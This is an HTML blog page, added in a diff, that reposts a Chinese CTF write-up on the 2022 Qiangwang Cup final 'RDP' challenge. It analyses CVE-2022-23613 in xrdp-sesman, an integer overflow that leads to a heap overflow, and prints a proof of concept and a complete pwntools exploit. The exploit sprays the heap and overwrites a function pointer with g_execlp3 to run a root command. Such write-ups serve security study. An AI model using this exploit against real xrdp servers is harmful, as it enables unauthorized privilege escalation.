@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2022 强网杯 final - RDP | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CVE-2022-23613 整型溢出堆溢出 + rdi 控命令 + g_execlp3 提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 强网杯 final - RDP">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Pwn/2022QWB_final_RDP/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="CVE-2022-23613 整型溢出堆溢出 + rdi 控命令 + g_execlp3 提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="XRDP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Pwn/2022QWB_final_RDP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2022 强网杯 final - RDP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022 强网杯 final - RDP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022 强网杯 final - RDP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/151803.html">https://www.ctfiot.com/151803.html</a><br>ID: 151803</p>
+</blockquote>
+<p>题目要求我们攻击XRDP程序，从而达到本地提权的效果。</p>
+<p>首先观察XRDP程序的版本信息：</p>
+<p>root@RDP:&#x2F;home&#x2F;rdp&#x2F;Desktop</p>
+<h1 id="xrdp-sesman-version"><a href="#xrdp-sesman-version" class="headerlink" title="xrdp-sesman -version"></a>xrdp-sesman -version</h1><p>xrdp-sesman 0.9.18<br> The xrdp session manager<br> Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.<br> See <a target="_blank" rel="noopener" href="https://github.com/neutrinolabs/xrdp">https://github.com/neutrinolabs/xrdp</a> for more information.</p>
+<p> Configure options:</p>
+<p>然后在CVE里搜一下发现有个漏洞版本刚好合适，并且满足题目的提权要求。</p>
+<p>从CVE介绍中获得漏洞补丁URL。<br>MISC:<br><a target="_blank" rel="noopener" href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa</a></p>
+<p>可以看到修改的代码行数很少，可以比较容易的分析出漏洞成因。</p>
+<p>根据patch信息以及漏洞描述可以判断出漏洞成因是size导致的整型溢出。这里的size会直接赋值给self-&gt;header_size。</p>
+<p>进入题目虚拟机之后会在RW文件夹下找到一个diff文件。</p>
+<p>看上去应该是作者为了方便我们使用漏洞实现提权操作而进行的一个diff。</p>
+<p>查看一下服务开放的服务。</p>
+<p>经分析，做题思路暂时可以确定为通过CVE-2022-23613漏洞配合题目所给出的diff攻击题目开放在3350的xrdp-sesman服务进行本地提权。</p>
+<p>接下来在源码中对程序漏洞进行一下简单的分析，在sesman.c中会有一个主循环sesman_main_loop，主循环会创建一个g_list_trans。</p>
+<p>其接收连接的函数主要实现在sesman_listen_conn_in中。</p>
+<p>最后走到patch中的sesman_data_in。</p>
+<p>有一个宏in_uint32_be，在parse.h中有具体展开，就不放了，其实就是从arg1中拿一个int出来给arg2，并让arg1作为int指针加一，这里可以理解成self-&gt;in_s指向了程序接收到的用户输入，其中第一个dword作为版本信息给version变量，第二个dword作为headersize给size变量。</p>
+<p>在这里由于size是可以自己指定的，所以相当于self-&gt;header_size变成了一个用户可控的int类型数据。</p>
+<p>在函数trans_check_wait_objs中有此变量的后续应用。</p>
+<p>if (self-&gt;type1 &#x3D;&#x3D; TRANS_TYPE_LISTENER)&#x2F;* listening <em>&#x2F;<br>{<br>g_sck_can_recv<br>g_sck_accept<br>…<br>}<br>else &#x2F;</em> connected server or client (2 or 3) *&#x2F;<br>{<br> if (self-&gt;si !&#x3D; 0 &amp;&amp; self-&gt;si-&gt;source[self-&gt;my_source] &gt; MAX_SBYTES)<br> {<br> }<br> else if (self-&gt;trans_can_recv(self, self-&gt;sck, 0))<br> {<br> cur_source &#x3D; XRDP_SOURCE_NONE;<br> if (self-&gt;si !&#x3D; 0)<br> {<br> cur_source &#x3D; self-&gt;si-&gt;cur_source;<br> self-&gt;si-&gt;cur_source &#x3D; self-&gt;my_source;<br> }<br> read_so_far &#x3D; (int) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br> to_read &#x3D; self-&gt;header_size - read_so_far;<br> if (to_read &gt; 0)<br> {<br> read_bytes &#x3D; self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);<br> ……<br> }<br> read_so_far &#x3D; (int) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);<br> if (read_so_far &#x3D;&#x3D; self-&gt;header_size)<br> {<br> if (self-&gt;trans_data_in !&#x3D; 0)<br> {<br> rv &#x3D; self-&gt;trans_data_in(self);<br> if (self-&gt;no_stream_init_on_data_in &#x3D;&#x3D; 0)<br> {<br> init_stream(self-&gt;in_s, 0);<br> }<br> }<br> }<br>}</p>
+<p>程序在此函数中进行了监听和接收数据的处理流程，其中比较值得注意的就是这行代码：</p>
+<p>to_read &#x3D; self-&gt;header_size - read_so_far;</p>
+<p>这里的to_read也为int，并且如果to_read大于零会执行self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);</p>
+<p>这个函数注册与create阶段：</p>
+<p>即实际执行的是trans_tcp_recv，追溯到最后就是原生的recv函数，而其缓冲区则是self-&gt;in_s，通过init_stream函数分配空间。</p>
+<p>分配到的是堆上的空间，而in_size则是在sesman.c中写死的8192。</p>
+<p>分析到这里整体漏洞成因已经彻底清楚了，如果我们能控制一个不受任何限制的header_size，将其控制为0x80000000，即一个最小负数，从而绕过header_size不能大于总的输入长度的限制，然后read_so_far作为一个随意的小数，相减以后发生负溢出，header_size将变成一个非常巨大的远超8192的正数，从而导致堆溢出发生。</p>
+<p>漏洞分析就到这里，接下来写一个poc调试一下看看是否会触发。</p>
+<p>首先看一下xrdp-sesman的pid，然后attach上去，写出poc脚本进行测试，attach的时候断点可以下在trans_check_wait_objs处。</p>
+<p>测试脚本非常简单。</p>
+<p>from pwn import *<br>payload&#x3D;b’v’*4<br>payload+&#x3D;p32(0x80000000)<br>io&#x3D;remote(“127.0.0.1”,3350)<br>io.send(payload)<br>io.send(‘a’*0x1000)</p>
+<p>成功断在了函数处。</p>
+<p>但是随着调试发现事情不对劲，这里明明应该是0x80000000和0x9，但是变成了0x80和0x9，导致预期的整数负溢出没有发生。</p>
+<p>这也就导致到了调用tcp_recv的时候rdx并不是一个非常大的数。</p>
+<p>猜测由于网络传输是大端序，所以不能直接p32，于是修改脚本：</p>
+<p>这一次成功将rdx修改为一个超大正整数，发生堆溢出。</p>
+<p>有了堆溢出以后，可以试着寻找分配在堆上且有函数指针的结构体，之前分析源码的时候有遇到过一个create函数。</p>
+<p>这里不仅输入输出缓冲区是用init_stream分配出来的堆空间，其本身也是g_malloc分配出来的堆空间，上面填充了recv，send等函数，如果能够通过堆溢出将recv函数为程序本身就有的g_execlp3，则相当于可以调用system函数，那么能否控制rdi呢？来看看recv函数具体调用的时候寄存器的状态。</p>
+<p>在调用的时候tcp_recv函数位置由rbx进行定位，而rbx和rdi所指向的都当前trans结构体，也就是说只要我们保证结构体中recv函数指针覆盖为exec的同时覆盖结构体的开头为我们想要执行的命令，则可以在下一次使用此trans接收数据的时候执行任意命令。</p>
+<p>还剩一个问题，就是堆空间非常复杂，我们能否精准的覆盖到指定的结构体上完成了漏洞利用，这个问题一定程度上来说出题人已经帮我们解决了一大半了，还记得当初的diff吗。将原本为16的MAX_SHORT_LIVED_CONNECTIONS改成了512，这意味着我们可以通过不停创建trans进行堆喷。</p>
+<p>通过堆溢出修改堆上的函数指针，并且rdi指向的是结构体头部，所以rdi也可以直接控下，由于我们的任务只是提权，所以可以提前在系统中写入要执行文件，这样在进行漏洞利用的时候只需要执行一条命令即可。</p>
+<p>在实际调试的过程中遇到好几处地方需要保证只是是一个可写地址，具体有哪些地址需要额外关照，有两种方式，第一种是通过对程序进行逆向，分析其机构体中有哪些字段需要为可写地址，第二种方式是直接调试，第一次覆盖的时候除了函数指针以外其余所有地方直接用0填充，然后下断点进行调试，就可以看到有些取值指令是执行失败的，遇到取值指令失败的地方就填一个可写地址上去，慢慢调就可以了。</p>
+<p>from pwn import *<br>elf&#x3D;ELF(‘.&#x2F;xrdp-sesman’)<br>li &#x3D; lambda x : print(‘x1b[01;38;5;214m’ + str(x) + ‘x1b[0m’)<br>ll &#x3D; lambda x : print(‘x1b[01;38;5;1m’ + str(x) + ‘x1b[0m’)<br>lg &#x3D; lambda x : print(‘ 33[32m’ + str(x) + ‘ 33[0m’)<br>with open(“&#x2F;tmp&#x2F;do”, “w”) as f:<br> f.write(“#!&#x2F;bin&#x2F;bashnecho “Ayaka” &gt; &#x2F;flag”)<br>os.system(“chmod a+x &#x2F;tmp&#x2F;do”)<br>conn_list&#x3D;[]<br>def heap_spray():<br> for i in range(100):<br> io&#x3D;remote(“127.0.0.1”,3350)<br> conn_list.append(io)<br>heap_spray()<br>bss&#x3D;0x40a000<br>input()<br>system_plt&#x3D;elf.plt[‘g_execlp3’]<br>payload&#x3D;b’v’<em>4<br>payload+&#x3D;p32(0x80000000)[::-1]<br>io1&#x3D;conn_list[97]<br>io1.send(payload)<br>payload&#x3D;p64(bss)</em>(0x4160&#x2F;&#x2F;8)+p64(0x2b0)+b’&#x2F;tmp&#x2F;dox00’<br>payload+&#x3D;p32(1)*2+p64(2)+p64(0)*3+p64(0x400318)+p64(bss)*2+p64(0)*71+p64(0x0000000000403BF0)+p64(0x0000000000403C40)*2<br>io1.send(payload)</p>
+<p>conn_list[98].send(“a”*8)</p>
+<p>看雪ID：Ayakaaa</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-954038.htm">https://bbs.kanxue.com/user-home-954038.htm</a></p>
+<p>*本文为看雪论坛优秀文章，由 Ayakaaa 原创，转载请注明来自看雪社区</p>
+<h1 id="往期推荐"><a href="#往期推荐" class="headerlink" title="往期推荐"></a>往期推荐</h1><p>1、2023 SDC 议题回顾 | 芯片安全和无线电安全底层渗透技术</p>
+<p>2、SWPUCTF 2021 新生赛-老鼠走迷宫</p>
+<p>3、OWASP 实战分析 level 1</p>
+<p>4、【远控木马】银狐组织最新木马样本-分析</p>
+<p>5、自研Unidbg trace工具实战ollvm反混淆</p>
+<p>6、2023 SDC 议题回顾 | 深入 Android 可信应用漏洞挖掘</p>
+<p>球分享</p>
+<p>球点赞</p>
+<p>球在看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">root@RDP:/home/rdp/Desktop</span><br><span class="line"># xrdp-sesman -version</span><br><span class="line">xrdp-sesman 0.9.18</span><br><span class="line"> The xrdp session manager</span><br><span class="line"> Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.</span><br><span class="line"> See https://github.com/neutrinolabs/xrdp for more information.</span><br><span class="line"></span><br><span class="line"> Configure options:</span><br><span class="line">if (self-&gt;type1 == TRANS_TYPE_LISTENER)/* listening */</span><br><span class="line">&#123;</span><br><span class="line">g_sck_can_recv</span><br><span class="line">g_sck_accept</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">else /* connected server or client (2 or 3) */</span><br><span class="line">&#123;</span><br><span class="line"> if (self-&gt;si != 0 &amp;&amp; self-&gt;si-&gt;source[self-&gt;my_source] &gt; MAX_SBYTES)</span><br><span class="line"> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> else if (self-&gt;trans_can_recv(self, self-&gt;sck, 0))</span><br><span class="line"> &#123;</span><br><span class="line"> cur_source = XRDP_SOURCE_NONE;</span><br><span class="line"> if (self-&gt;si != 0)</span><br><span class="line"> &#123;</span><br><span class="line"> cur_source = self-&gt;si-&gt;cur_source;</span><br><span class="line"> self-&gt;si-&gt;cur_source = self-&gt;my_source;</span><br><span class="line"> &#125;</span><br><span class="line"> read_so_far = (int) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line"> to_read = self-&gt;header_size - read_so_far;</span><br><span class="line"> if (to_read &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read);</span><br><span class="line"> ......</span><br><span class="line"> &#125;</span><br><span class="line"> read_so_far = (int) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line"> if (read_so_far == self-&gt;header_size)</span><br><span class="line"> &#123;</span><br><span class="line"> if (self-&gt;trans_data_in != 0)</span><br><span class="line"> &#123;</span><br><span class="line"> rv = self-&gt;trans_data_in(self);</span><br><span class="line"> if (self-&gt;no_stream_init_on_data_in == 0)</span><br><span class="line"> &#123;</span><br><span class="line"> init_stream(self-&gt;in_s, 0);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">to_read = self-&gt;header_size - read_so_far;</span><br><span class="line">from pwn import *</span><br><span class="line">payload=b&#x27;v&#x27;*4</span><br><span class="line">payload+=p32(0x80000000)</span><br><span class="line">io=remote(&quot;127.0.0.1&quot;,3350)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(&#x27;a&#x27;*0x1000)</span><br><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&#x27;./xrdp-sesman&#x27;)</span><br><span class="line">li = lambda x : print(&#x27;x1b[01;38;5;214m&#x27; + str(x) + &#x27;x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;x1b[01;38;5;1m&#x27; + str(x) + &#x27;x1b[0m&#x27;)</span><br><span class="line">lg = lambda x : print(&#x27; 33[32m&#x27; + str(x) + &#x27; 33[0m&#x27;)</span><br><span class="line">with open(&quot;/tmp/do&quot;, &quot;w&quot;) as f:</span><br><span class="line"> f.write(&quot;#!/bin/bashnecho &quot;Ayaka&quot; &gt; /flag&quot;)</span><br><span class="line">os.system(&quot;chmod a+x /tmp/do&quot;)</span><br><span class="line">conn_list=[]</span><br><span class="line">def heap_spray():</span><br><span class="line"> for i in range(100):</span><br><span class="line"> io=remote(&quot;127.0.0.1&quot;,3350)</span><br><span class="line"> conn_list.append(io)</span><br><span class="line">heap_spray()</span><br><span class="line">bss=0x40a000</span><br><span class="line">input()</span><br><span class="line">system_plt=elf.plt[&#x27;g_execlp3&#x27;]</span><br><span class="line">payload=b&#x27;v&#x27;*4</span><br><span class="line">payload+=p32(0x80000000)[::-1]</span><br><span class="line">io1=conn_list[97]</span><br><span class="line">io1.send(payload)</span><br><span class="line">payload=p64(bss)*(0x4160//8)+p64(0x2b0)+b&#x27;/tmp/dox00&#x27;</span><br><span class="line">payload+=p32(1)*2+p64(2)+p64(0)*3+p64(0x400318)+p64(bss)*2+p64(0)*71+p64(0x0000000000403BF0)+p64(0x0000000000403C40)*2</span><br><span class="line">io1.send(payload)</span><br><span class="line"></span><br><span class="line">conn_list[98].send(&quot;a&quot;*8)</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/151803.html">https://www.ctfiot.com/151803.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2022QWB_final_RDP.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2022QWB_final_RDP.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XRDP/">XRDP</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Crypto/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-2022-CryptoCTF-%E4%B8%80/" title="赛题复现:2022-CryptoCTF(一)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">赛题复现:2022-CryptoCTF(一)</div></div></a></div><div class="next-post pull-right"><a 